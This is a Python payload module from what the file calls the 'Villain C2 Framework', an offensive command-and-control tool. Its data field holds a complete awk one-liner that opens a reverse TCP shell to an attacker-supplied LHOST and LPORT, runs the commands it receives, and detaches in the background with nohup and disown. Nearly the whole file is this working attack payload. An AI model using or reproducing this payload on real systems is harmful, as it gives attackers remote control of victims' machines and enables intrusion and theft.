# This module is part of the "Villain C2 Framework"

from typing import ClassVar


class Payload:

    info: ClassVar[dict] = {
        'Title' : 'Awk reverse TCP',
        'Author' : 'Unknown',
        'Description' : 'Awk reverse TCP',
        'References' : ['https://revshells.com']
    }

    meta: ClassVar[dict] = {
        'handler' : 'netcat',
        'type' : 'awk-reverse-tcp',
        'os' : 'linux'   
    }

    config: ClassVar[dict] = {}

    parameters: ClassVar[dict] = {
        'lhost' : None
    }

    attrs: ClassVar[dict] = {}

    data = "nohup awk 'BEGIN {s = \"/inet/tcp/0/*LHOST*/*LPORT*\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' > /dev/null 2>&1 & disown"
